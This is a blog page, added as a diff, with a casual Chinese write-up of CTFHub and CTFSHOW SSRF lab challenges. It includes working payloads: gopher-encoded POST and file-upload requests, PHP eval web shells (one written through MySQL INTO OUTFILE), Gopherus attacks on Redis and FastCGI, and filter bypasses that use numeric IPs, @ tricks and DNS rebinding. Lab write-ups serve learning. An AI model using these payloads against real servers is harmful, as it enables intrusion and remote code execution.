@@ -1,0 +1,554 @@
+
+<!DOCTYPE html>
+<html lang="zh-CN ">
+
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Hoylindo || CTFHUB&amp;CTFSHOW-SSRF_WP</title>
+    <meta name="author" content="hoylindo">
+    <meta name="description" content="嗨，这里是一个搭建的不太熟练的小破站 ">
+    <meta name="keywords" content=" ">
+    <link rel="icon" href="/1.jpg">
+    <link rel="stylesheet" href="/css/antd.min.css">
+    
+    <link rel="stylesheet" href="/css/maiden-theme.css">
+    
+    <script src="/js/vue.js"></script>
+    <script src="/js/antd.min.js"></script>
+<meta name="generator" content="Hexo 5.4.2"></head>
+
+<body>
+
+    <div id="loading"
+        style="height: 100vh; width: 100%; position: fixed;display: flex;z-index: 200; justify-content: space-between;">
+        <div id="loadleft" style="width: 50%;background-color: #ffffff;transition: width 0.6s ease-out;"></div>
+        <div id="loadright" style="width: 50%;background-color: #ffffff;transition: width 0.6s ease-out;"></div>
+        <div
+            style="position: fixed; height: 100vh; width: 100%;display: flex;justify-content: center;align-items: center;">
+            <div id="loadcontent"
+                style="width:400px;height:400px;padding:50px;border-radius:50%;display:flex;justify-content:center;align-items:center;border:solid 10px#fba3cf; text-align:center;opacity:1;transition:opacity 0.3s ease-out;">
+                <div>
+                    <h2>LOADING...</h2>
+                    <p>dadadadadada~</p>
+                    <div>
+                        <img src="/dancingkitty.gif" alt="loading">
+                    </div>
+                </div>
+            </div>
+        </div>
+    </div>
+
+    <div id="layout">
+        <transition name="into">
+            <div v-show="show_page" style="display: none;">
+                <div id="menu_show">
+                     
+<nav id="menu">
+    <div class="desktop-menu">
+        <a href="/">
+            <span class="title">Hoylindo</span>
+        </a>
+        
+        <a href="/">
+            <span>
+                <a-icon type="home" theme="filled" />
+            </span>
+            <span>home</span>
+        </a>
+        
+        <a href="/about">
+            <span>
+                <a-icon type="idcard" theme="filled" />
+            </span>
+            <span>about</span>
+        </a>
+        
+        <a href="/archives">
+            <span>
+                <a-icon type="folder" theme="filled" />
+            </span>
+            <span>archives</span>
+        </a>
+        
+        <a href="/categories">
+            <span>
+                <a-icon type="book" theme="filled" />
+            </span>
+            <span>categories</span>
+        </a>
+        
+        <a href="/tags">
+            <span>
+                <a-icon type="tags" theme="filled" />
+            </span>
+            <span>tags</span>
+        </a>
+        
+    </div>
+
+    <div :class="'phone-menu ' + menu_show" id="phone-menu">
+        <div :class="'title'" @click="menu_show=!menu_show">
+            <span style="margin-right: 10px;">
+                <a-icon type="appstore" theme="filled" />
+            </span>
+            <span>Hoylindo</span>
+        </div>
+        <div class="items" v-show="menu_show">
+            
+            <a href="/">
+                <div class="item">
+                    <div style="min-width:20px; max-width:50px; width: 10%">
+                        <a-icon type="home" theme="filled" />
+                    </div>
+                    <div style="min-width:100px;max-width: 150%;width: 20%;">home</div>
+                </div>
+            </a>
+            
+            <a href="/about">
+                <div class="item">
+                    <div style="min-width:20px; max-width:50px; width: 10%">
+                        <a-icon type="idcard" theme="filled" />
+                    </div>
+                    <div style="min-width:100px;max-width: 150%;width: 20%;">about</div>
+                </div>
+            </a>
+            
+            <a href="/archives">
+                <div class="item">
+                    <div style="min-width:20px; max-width:50px; width: 10%">
+                        <a-icon type="folder" theme="filled" />
+                    </div>
+                    <div style="min-width:100px;max-width: 150%;width: 20%;">archives</div>
+                </div>
+            </a>
+            
+            <a href="/categories">
+                <div class="item">
+                    <div style="min-width:20px; max-width:50px; width: 10%">
+                        <a-icon type="book" theme="filled" />
+                    </div>
+                    <div style="min-width:100px;max-width: 150%;width: 20%;">categories</div>
+                </div>
+            </a>
+            
+            <a href="/tags">
+                <div class="item">
+                    <div style="min-width:20px; max-width:50px; width: 10%">
+                        <a-icon type="tags" theme="filled" />
+                    </div>
+                    <div style="min-width:100px;max-width: 150%;width: 20%;">tags</div>
+                </div>
+            </a>
+            
+        </div>
+        <div class="curtain" v-show="menu_show"></div>
+    </div>
+
+</nav>
+                </div>
+
+                <div id="main">
+                     
+<link rel="stylesheet" href="/css/post-body.css">
+<div class="article">
+    <div>
+        <h1>CTFHUB&amp;CTFSHOW-SSRF_WP </h1>
+    </div>
+    <div class="info">
+        <span class="date">
+            <span class="icon">
+                <a-icon type="calendar" theme="filled" />
+            </span>
+            2022/8/30
+        </span>
+
+        
+        <span class="category">
+            <a href="/categories/关于web安全">
+                <span class="icon">
+                    <a-icon type="book" theme="filled" />
+                </span>
+                关于web安全
+            </a>
+        </span>
+        
+
+        
+
+        <span class="tags">
+            <span class="icon">
+                <a-icon type="tags" theme="filled" />
+            </span>
+            
+            <span class="tag">
+                
+                <a href="/tags/SSRF" style=color:#00bcd4>
+                    SSRF
+                </a>
+            </span>
+            
+        </span>
+        
+    </div>
+
+    <div class="content" v-pre>
+        <p>写的很随意的一点wp</p>
+<span id="more"></span>
+
+<h3 id="CTFHub-SSRF-内网访问"><a href="#CTFHub-SSRF-内网访问" class="headerlink" title="CTFHub-SSRF-内网访问"></a>CTFHub-SSRF-内网访问</h3><blockquote>
+<ol>
+<li>get传参，令<code>url=127.0.0.1/flag.php</code></li>
+<li>得到flag</li>
+</ol>
+</blockquote>
+<h3 id="CTFHub-SSRF-伪协议"><a href="#CTFHub-SSRF-伪协议" class="headerlink" title="CTFHub-SSRF-伪协议"></a>CTFHub-SSRF-伪协议</h3><blockquote>
+<ul>
+<li>file协议：<ul>
+<li>file://用于访问本地文件系统</li>
+<li>用法：file:// [文件的绝对路径和文件名]</li>
+<li>一般网站的目录都放在www/html/目录下，/var/www/html是Web服务器的默认根文件夹</li>
+</ul>
+</li>
+</ul>
+<ol>
+<li><code>/?url=file:///var/www/html/flag.php</code></li>
+<li>查看源码得到flag</li>
+</ol>
+</blockquote>
+<h3 id="CTFHub-SSRF-端口扫描"><a href="#CTFHub-SSRF-端口扫描" class="headerlink" title="CTFHub-SSRF-端口扫描"></a>CTFHub-SSRF-端口扫描</h3><blockquote>
+<ul>
+<li>端口扫描，一搜出来两个淘宝链接，哦原来我还不如一个开淘宝店的</li>
+<li>依稀记得bp是可以拿来干这个事情的但是严格来说这个是bp的爆破功能</li>
+<li>bp跑的可真慢啊。。。。。。。。。。手工分段分了四段四个窗口爆破</li>
+<li>不知道是不是社区版的原因还是版本救了，那也没办法，两个Java环境我是真遭不住啊</li>
+<li>找到你了！8893！直接点开看response拿到flag</li>
+<li>url=127.0.0.1:8893</li>
+</ul>
+</blockquote>
+<h3 id="CTFHub-SSRF-POST请求"><a href="#CTFHub-SSRF-POST请求" class="headerlink" title="CTFHub-SSRF-POST请求"></a>CTFHub-SSRF-POST请求</h3><blockquote>
+<ul>
+<li><p>POST传参url=127.0.0.1得到一个key：914af5faca0f9e1b81bc650d0537884e</p>
+</li>
+<li><p>继续探索，post传一个伪协议得到一段源码（flag.php）：</p>
+</li>
+<li><pre><code class="php">&lt;?php
+    
+error_reporting(0);
+    
+if ($_SERVER[&quot;REMOTE_ADDR&quot;] != &quot;127.0.0.1&quot;) &#123;
+    echo &quot;Just View From 127.0.0.1&quot;;
+    return;
+&#125;
+    
+$flag=getenv(&quot;CTFHUB&quot;);
+$key = md5($flag);
+    
+if (isset($_POST[&quot;key&quot;]) &amp;&amp; $_POST[&quot;key&quot;] == $key) &#123;
+    echo $flag;
+    exit;
+&#125;
+</code></pre>
+</li>
+<li><p>熟悉的server陌生的参数：$_SERVER[‘REMOTE_ADDR’]：这个系统变量是你的客户端跟你的服务器“握手”时候的IP，如果使用了“匿名代理（anonymous）”，REMOTE_ADDR将显示代理服务器的IP，访问端（有可能是用户，有可能是代理的）IP</p>
+</li>
+<li><p>在PHP中getenv ( 参数 )函数是一个用于获取环境变量的函数，根据提供不同的参数可以获取不同的环境变量， 当前正在执行脚本的文件名，与document root 相关，没看出来有什么作用</p>
+</li>
+<li><p><strong>总结：</strong>要求保证IP地址是127.0.0.1并且以post的方式传入key（就是上边的字符串）</p>
+</li>
+</ul>
+<p>——————-分割线—————–</p>
+<ul>
+<li><p>index.php被302跳转了，看一下它的源码：</p>
+</li>
+<li><pre><code class="php">&lt;?php
+    
+error_reporting(0);
+    
+if (!isset($_REQUEST[&#39;url&#39;]))&#123;
+    header(&quot;Location: /?url=_&quot;);
+    exit;
+&#125;
+    
+$ch = curl_init();
+curl_setopt($ch, CURLOPT_URL, $_REQUEST[&#39;url&#39;]);
+curl_setopt($ch, CURLOPT_HEADER, 0);
+curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
+curl_exec($ch);
+curl_close($ch);
+</code></pre>
+</li>
+<li><p>用了curl函数来获取并且输出数据，curl可以支持的伪协议有很多,gopher,file,dict,http/s</p>
+</li>
+<li><p>要求传入一个url，不限制请求方式，因此可以通过gopher协议，向flag.php传一个post报文：</p>
+<ul>
+<li><pre><code class="http">POST /flag.php HTTP/1.1
+Host: 127.0.0.1:80
+Content-Length: 36
+Content-Type: application/x-www-form-urlencoded
+    
+key=51457bb0a50c1eb2c92dcc3ec3c2cc13
+</code></pre>
+</li>
+</ul>
+</li>
+<li><p>报文内容显示在url上输入，被解码后保存到curl里面，再通过curl输出跳转，又解码了一次，所以要对POST报文内容进行两次url编码</p>
+</li>
+<li><p><code>?url=gopher://127.0.0.1:80/_POST%2520%252Fflag.php%2520HTTP%252F1.1%250D%250AHost%253A%2520127.0.0.1%253A80%250D%250AContent-Length%253A%252036%250D%250AContent-Type%253A%2520application%252Fx-www-form-urlencoded%250D%250A%250D%250Akey%253D914af5faca0f9e1b81bc650d0537884e</code>，得到flag</p>
+</li>
+</ul>
+</blockquote>
+<h3 id="CTFHub-SSRF-上传文件"><a href="#CTFHub-SSRF-上传文件" class="headerlink" title="CTFHub-SSRF-上传文件"></a>CTFHub-SSRF-上传文件</h3><blockquote>
+<ul>
+<li><p>提示要上传一个文件到 \flag.php，初步怀疑是用上一个题的方法传一个木马进去</p>
+</li>
+<li><p>试着读一下源码，很遗憾，什么都没有读到，上御剑</p>
+</li>
+<li><p>很遗憾，伪协议敲错了，读到flag.php：</p>
+</li>
+<li><pre><code class="php">error_reporting(0);
+    
+if($_SERVER[&quot;REMOTE_ADDR&quot;] != &quot;127.0.0.1&quot;)&#123;
+    echo &quot;Just View From 127.0.0.1&quot;;
+    return;
+&#125;
+    
+if(isset($_FILES[&quot;file&quot;]) &amp;&amp; $_FILES[&quot;file&quot;][&quot;size&quot;] &gt; 0)&#123;
+    echo getenv(&quot;CTFHUB&quot;);
+    exit;
+&#125;
+</code></pre>
+</li>
+<li><p>怎么这么眼熟呢，果然是gopher协议</p>
+</li>
+<li><p>先上传个文件抓个包（离谱的是的是，网页本身没有提交文件的按钮，f12自己加一个：<code>&lt;input type=&quot;submit&quot; name=&quot;submit&quot;&gt;</code>）</p>
+</li>
+<li><p>请求信息全部复制下来，两次url编码，记得把%0A换成%0D%0A，然后上一题的套路，直接gopher协议传进去，得到flag</p>
+</li>
+<li><pre><code class="http">?url=gopher://127.0.0.1:80/_POST%2520%252Fflag.php%2520HTTP%252F1.1%250D%250AHost%253A%2520challenge-7e9b3eb463ae9fc4.sandbox.ctfhub.com%253A10800%250D%250AUser-Agent%253A%2520Mozilla%252F5.0%2520(Windows%2520NT%252010.0%253B%2520Win64%253B%2520x64%253B%2520rv%253A102.0)%2520Gecko%252F20100101%2520Firefox%252F102.0%250D%250AAccept%253A%2520text%252Fhtml%252Capplication%252Fxhtml%252Bxml%252Capplication%252Fxml%253Bq%253D0.9%252Cimage%252Favif%252Cimage%252Fwebp%252C*%252F*%253Bq%253D0.8%250D%250AAccept-Language%253A%2520zh-CN%252Czh%253Bq%253D0.8%252Czh-TW%253Bq%253D0.7%252Czh-HK%253Bq%253D0.5%252Cen-US%253Bq%253D0.3%252Cen%253Bq%253D0.2%250D%250AAccept-Encoding%253A%2520gzip%252C%2520deflate%250D%250AContent-Type%253A%2520multipart%252Fform-data%253B%2520boundary%253D---------------------------89800895834957885263732665617%250D%250AContent-Length%253A%2520403%250D%250AOrigin%253A%2520http%253A%252F%252Fchallenge-7e9b3eb463ae9fc4.sandbox.ctfhub.com%253A10800%250D%250AConnection%253A%2520close%250D%250AReferer%253A%2520http%253A%252F%252Fchallenge-7e9b3eb463ae9fc4.sandbox.ctfhub.com%253A10800%252F%253Furl%253Dfile%253A%252F%252F%252Fvar%252Fwww%252Fhtml%252Fflag.php%250D%250AUpgrade-Insecure-Requests%253A%25201%250D%250A%250D%250A-----------------------------89800895834957885263732665617%250D%250AContent-Disposition%253A%2520form-data%253B%2520name%253D%2522file%2522%253B%2520filename%253D%25222.php%2522%250D%250AContent-Type%253A%2520application%252Foctet-stream%250D%250A%250D%250A%253C%253Fphp%2520phpinfo()%253B%2520%2540eval(%2524_POST%255B&#39;haoye&#39;%255D)%253B%2520%253F%253E%250D%250A-----------------------------89800895834957885263732665617%250D%250AContent-Disposition%253A%2520form-data%253B%2520name%253D%2522submit%2522%250D%250A%250D%250A%25C3%25A6%25C2%258F%25C2%2590%25C3%25A4%25C2%25BA%25C2%25A4%25C3%25A6%25C2%259F%25C2%25A5%25C3%25A8%25C2%25AF%25C2%25A2%250D%250A-----------------------------89800895834957885263732665617--
+</code></pre>
+</li>
+</ul>
+</blockquote>
+<h3 id="CTFHub-SSRF—fastcgi协议"><a href="#CTFHub-SSRF—fastcgi协议" class="headerlink" title="CTFHub-SSRF—fastcgi协议"></a>CTFHub-SSRF—fastcgi协议</h3><blockquote>
+<ul>
+<li>题解没太看懂，需要一个脚本，我还没有py2，拿别人脚本跑出来的payload过了，好耶</li>
+<li>今天太困了明天好好研究研究，附件文章：<a target="_blank" rel="noopener" href="https://blog.csdn.net/mysteryflower/article/details/94386461">Fastcgi协议分析 &amp;&amp; PHP-FPM未授权访问漏洞 &amp;&amp; Exp编写</a></li>
+<li><a target="_blank" rel="noopener" href="https://blog.csdn.net/qq_64201116/article/details/125426151">ctfhub利用SSRF攻击内网FastCGI协议</a></li>
+<li><a target="_blank" rel="noopener" href="https://soapffz.com/archives/566/">SSRF 学习之 ctfhub靶场-FastCGI</a></li>
+</ul>
+<p>————————–分割线——————————-</p>
+<ul>
+<li>时隔n天，我肥来了！</li>
+<li>上次做到一半环境504了也是服了，然后因为别的事情等等等等导致这个题拖到了今天了</li>
+<li>找了个好用的脚本叫gopherus，要求py2的环境（Java能不能学一学py的环境，那么好切）</li>
+<li>脚本跑起来~第一行输入的是网页可访问到的文件或者文件的路径，第二行是想执行的命令</li>
+<li>所以为什么有人Linux命令学的那么垃圾呢</li>
+<li>把脚本生成的东西拿去url编码后直接传参，<code>ls /</code>找到一个flag_3f6f5257c78bfdb4654c09cfab6c02a6文件</li>
+<li><code>cat /flag_3f6f5257c78bfdb4654c09cfab6c02a6</code>，得到flag</li>
+</ul>
+</blockquote>
+<h3 id="CTFHub-SSRF—redis协议"><a href="#CTFHub-SSRF—redis协议" class="headerlink" title="CTFHub-SSRF—redis协议"></a>CTFHub-SSRF—redis协议</h3><blockquote>
+<ul>
+<li>此处特别感谢gopherus</li>
+<li><code>python gopherus.py --exploit redis</code>，第一行选择shell类型，第二行选择路径，默认路径/var/www/html</li>
+<li>第三行写想传的马，生成的payload拿去编码，传参</li>
+<li>看了好几个题解，都说网页504了就证明成功了，虽然但是我并不知道为啥，蚁剑连接，得到flag</li>
+</ul>
+</blockquote>
+<h3 id="CTFHub-SSRF—URL-Bypass"><a href="#CTFHub-SSRF—URL-Bypass" class="headerlink" title="CTFHub-SSRF—URL Bypass"></a>CTFHub-SSRF—URL Bypass</h3><blockquote>
+<ul>
+<li>题目要求请求的URL中必须包含<a target="_blank" rel="noopener" href="http://notfound.ctfhub.com/">http://notfound.ctfhub.com</a></li>
+<li>传参：?url=<a target="_blank" rel="noopener" href="http://notfound.ctfhub.com@127.0.0.1/flag.php%EF%BC%8C%E5%BE%97%E5%88%B0flag">http://notfound.ctfhub.com@127.0.0.1/flag.php，得到flag</a></li>
+<li>试了一下xip.io，被ban了</li>
+</ul>
+</blockquote>
+<h3 id="CTFHub-SSRF—数字IP-Bypass"><a href="#CTFHub-SSRF—数字IP-Bypass" class="headerlink" title="CTFHub-SSRF—数字IP Bypass"></a>CTFHub-SSRF—数字IP Bypass</h3><blockquote>
+<ul>
+<li>这次ban掉了127以及172.不能使用点分十进制的IP了</li>
+<li>提示看错了以为只是ban了127和172，试了一哈十六进制，结果提示：hacker! Ban ‘/127|172|@|./‘</li>
+<li>原来是吧<code>.</code>也给ban了，传参：?url=localhost/flag.php</li>
+<li>可以使用IP地址转换器：十进制：?url=2130706433/flag.php；十六进制：?url=0x7F000001/flag.php</li>
+</ul>
+</blockquote>
+<h3 id="CTFHub-SSRF—302跳转-Bypass"><a href="#CTFHub-SSRF—302跳转-Bypass" class="headerlink" title="CTFHub-SSRF—302跳转 Bypass"></a>CTFHub-SSRF—302跳转 Bypass</h3><blockquote>
+<ul>
+<li>试了?绕过不行，结果 ?url=localhost/flag.php过了….这么离谱的吗</li>
+<li><a target="_blank" rel="noopener" href="https://www.985.so/">短网址-短链接生成</a>看到有一种短链接跳转绕过，但是时间不够了，没有探索成功</li>
+<li>或者使用十进制IP绕过，但是也没来的及试呜呜呜</li>
+</ul>
+</blockquote>
+<h3 id="CTFHub-SSRF—DNS重绑定-Bypass"><a href="#CTFHub-SSRF—DNS重绑定-Bypass" class="headerlink" title="CTFHub-SSRF—DNS重绑定 Bypass"></a>CTFHub-SSRF—DNS重绑定 Bypass</h3><blockquote>
+<ul>
+<li><a target="_blank" rel="noopener" href="https://lock.cmpxchg8b.com/rebinder.html">域名解析重新绑定服务</a>来这里弄一个域名：7f000001.7f000002.rbndr.us</li>
+<li>直接：?url=7f000001.7f000002.rbndr.us/flag.php，bp抓包，repeater，一次不行就两次，两次不行就好多次，得到flag</li>
+</ul>
+</blockquote>
+<h3 id="CTFSHOW-web351"><a href="#CTFSHOW-web351" class="headerlink" title="CTFSHOW-web351"></a>CTFSHOW-web351</h3><blockquote>
+<p>直接post传url=127.0.0.1/flag.php</p>
+</blockquote>
+<h3 id="CTFSHOW-web352"><a href="#CTFSHOW-web352" class="headerlink" title="CTFSHOW-web352"></a>CTFSHOW-web352</h3><blockquote>
+<ul>
+<li>这里有个函数parse_url()，用于通过解析返回url的组件，它解析一个URL并返回一个包含其各个组件的关联数组</li>
+<li>题意是参数须包含http或者https，post传参url=<a target="_blank" rel="noopener" href="http://127.0.0.1/flag.php">http://127.0.0.1/flag.php</a></li>
+<li>if(!preg_match(‘/localhost|127.0.0/‘))这段正则写的很奇怪，参数呢？？？</li>
+</ul>
+</blockquote>
+<h3 id="CTFSHOW-web353"><a href="#CTFSHOW-web353" class="headerlink" title="CTFSHOW-web353"></a>CTFSHOW-web353</h3><blockquote>
+<ul>
+<li>过滤了localhost和127还有<code>. 。</code>什么的</li>
+<li>数字IP绕过：post传url=<a target="_blank" rel="noopener" href="http://127.0.0.1/flag.php%E6%88%96%E8%80%85url=http://0x7F000001/flag.php">http://2130706433/flag.php或者url=http://0x7F000001/flag.php</a></li>
+</ul>
+</blockquote>
+<h3 id="CTFSHOW-web354"><a href="#CTFSHOW-web354" class="headerlink" title="CTFSHOW-web354"></a>CTFSHOW-web354</h3><blockquote>
+<ul>
+<li><p>过滤了localhost和<code>1 0 。</code>，看起来像是短链接</p>
+</li>
+<li><p>生成的短连接包含1，呜呜呜又不想找别的了</p>
+</li>
+<li><p>学到了，sudo.cc指向的IP就是127.0.0.1，好耶，post传参url=<a target="_blank" rel="noopener" href="http://sudo.cc/flag.php">http://sudo.cc/flag.php</a></p>
+</li>
+<li><p>找到了好几个解析到127.0.0.1的域名：</p>
+<ul>
+<li><p><a target="_blank" rel="noopener" href="http://safe.taobao.com/">http://safe.taobao.com/</a></p>
+</li>
+<li><p><a target="_blank" rel="noopener" href="http://wifi.aliyun.com/">http://wifi.aliyun.com/</a></p>
+</li>
+<li><p><a target="_blank" rel="noopener" href="http://ecd.tencent.com/">http://ecd.tencent.com/</a></p>
+</li>
+</ul>
+</li>
+</ul>
+</blockquote>
+<h3 id="CTFSHOW-web355"><a href="#CTFSHOW-web355" class="headerlink" title="CTFSHOW-web355"></a>CTFSHOW-web355</h3><blockquote>
+<ul>
+<li>限制了host长度，又双叒叕学到了：127.1是127.0.0.1的简写省略形式， 0在linux系统中会解析成127.0.0.1在windows中解析成0.0.0.0</li>
+<li>post传参：url=<a target="_blank" rel="noopener" href="http://0.0.0.0/flag.php%E6%88%96url=http://127.1/flag.php">http://0/flag.php或url=http://127.1/flag.php</a></li>
+</ul>
+</blockquote>
+<h3 id="CTFSHOW-web356"><a href="#CTFSHOW-web356" class="headerlink" title="CTFSHOW-web356"></a>CTFSHOW-web356</h3><blockquote>
+<ul>
+<li>这次限制了长度小于3，post传参：url=<a target="_blank" rel="noopener" href="http://0.0.0.0/flag.php">http://0/flag.php</a></li>
+</ul>
+</blockquote>
+<h3 id="CTFSHOW-web357"><a href="#CTFSHOW-web357" class="headerlink" title="CTFSHOW-web357"></a>CTFSHOW-web357</h3><blockquote>
+<ul>
+<li>DNS重绑定，两个函数：<ul>
+<li><code>$ip = gethostbyname($x[&#39;host&#39;]);</code>—— 返回主机名对应的 IPv4地址</li>
+<li><code>if(!filter_var($ip, FILTER_VALIDATE_IP, FILTER_FLAG_NO_PRIV_RANGE | FILTER_FLAG_NO_RES_RANGE))</code><ul>
+<li>获取一个变量，并进行过滤</li>
+<li>过滤器<code>FILTER_VALIDATE_IP</code>把值作为 IP 地址来验证，只限 IPv4 或 IPv6 或 不是来自私有或者保留的范围</li>
+<li><code>FILTER_FLAG_NO_PRIV_RANGE</code>要求值是 RFC 指定的私域 IP （比如 192.168.0.1）</li>
+<li><code>FILTER_FLAG_NO_RES_RANGE</code>要求值不在保留的 IP 范围内，该标志接受 IPV4 和 IPV6 值</li>
+</ul>
+</li>
+</ul>
+</li>
+<li>post传参url=http://[生成的域名]/flag.php</li>
+</ul>
+</blockquote>
+<h3 id="CTFSHOW-web358"><a href="#CTFSHOW-web358" class="headerlink" title="CTFSHOW-web358"></a>CTFSHOW-web358</h3><blockquote>
+<ul>
+<li><code>if(preg_match(&#39;/^http:\/\/ctf\..*show$/i&#39;,$url))</code>要求以<code>ctf.</code>开始以<code>show</code>结束，中间任意</li>
+<li>post传参url=<a target="_blank" rel="noopener" href="http://ctf.@127.0.0.1/flag.php?show">http://ctf.@127.0.0.1/flag.php?show</a></li>
+</ul>
+</blockquote>
+<h3 id="CTFSHOW-web359"><a href="#CTFSHOW-web359" class="headerlink" title="CTFSHOW-web359"></a>CTFSHOW-web359</h3><blockquote>
+<ul>
+<li>打开是一个登录界面，账号密码随便填，抓包可以看到一个叫returl的参数，把它改成<a target="_blank" rel="noopener" href="http://www.baidu.com,返回百度的页面/">www.baidu.com，返回百度的页面</a></li>
+<li>提示是打无密码的mysql，上gopherus</li>
+<li>SQL写马学到了：<ul>
+<li>在 MySQL 中，可以使用 SELECTI…INTO OUTFILE 语句将表的内容导出成一个文本文件</li>
+<li>语句基本格式如下：<code>SELECT 列名 FROM table [WHERE 语句] INTO OUTFILE &#39;目标文件&#39;[OPTIONS]</code></li>
+<li><code>select &quot;&lt;?php @eval($_POST[&#39;cmd&#39;]);?&gt;&quot; into outfile &#39;/var/www/html/2.php&#39;;</code></li>
+</ul>
+</li>
+<li>生成的payload编码后直接传进去，蚁剑连接，得到flag</li>
+</ul>
+</blockquote>
+<h3 id="CTFSHOW-web360"><a href="#CTFSHOW-web360" class="headerlink" title="CTFSHOW-web360"></a>CTFSHOW-web360</h3><blockquote>
+<ul>
+<li>提示打redis，这个我熟啊，怎么回事怎么回事怎么回事怎么回事怎么就504了？？？？？？？？？？？？！！！！！！</li>
+<li>重开x10086==失败，放弃了，就跟ctfhub那个redis协议一个做法</li>
+</ul>
+</blockquote>
+
+    </div>
+
+    
+</div>
+                     
+<footer id="footer">
+    <div class="footer-wrap">
+        <div>
+            © 2022 - 2022 Hoylindo
+            <span class="footer-icon">
+                <a-icon type="flag" theme="filled" /></span>
+            @hoylindo
+        </div>
+        <div></div>
+        <div>Based on the <a target="_blank" rel="noopener" href="https://hexo.io/">Hexo Engine</a> & <a
+                target="_blank" rel="noopener" href="https://github.com/korilin/hexo-theme-particle">Particle Theme</a></div>
+        
+    </div>
+
+</footer>
+
+<script src="/js/highlight.min.js"></script>
+<script src="/js/particle.js"></script>
+                </div>
+            </div>
+        </transition>
+    </div>
+
+    <canvas id="background" style="position:fixed;top:0;left:0;width:100vw;height:100vh;pointer-events:none;z-index:-1" ></canvas> 
+    <script src="/js/1.js"></script>
+    
+    <canvas class="fireworks" style="position: fixed; left: 0; top: 0; z-index: 99999999; pointer-events: none;"></canvas>
+    <script type="text/javascript" src="/js/aixin.js"></script>
+    <script type="text/javascript" src="/js/anime.min.js"></script>
+    <script type="text/javascript" src="/js/fireworks.js"></script>
+
+    <script>
+    new Vue({
+        el: "#layout",
+        data: {
+            show_page: false,
+            onload_menu: false,
+            menu_show: false,
+            card_top: 100
+        },
+        created: function () {
+            var that = this
+            window.onload = function () {
+                that.show_page = true
+                document.getElementById("loadcontent").style.opacity = 0
+                setTimeout(function () {
+                    document.getElementById("loadleft").style.width = 0
+                    document.getElementById("loadright").style.width = 0
+                }, 300)
+                setTimeout(function () {
+                    document.getElementById("loading").style = "display:none"
+                }, 600)
+            }
+        },
+        mounted: function () {
+            var that = this
+            window.addEventListener('scroll', function (e) {
+                that.menu_show = false
+            })
+        },
+        methods: {
+            home_click: function () {
+                window.scrollTo({
+                    top: window.innerHeight - 80,
+                    behavior: "smooth",
+                });
+            }
+        }
+    })
+</script>
+
+</body>
+
+</html>
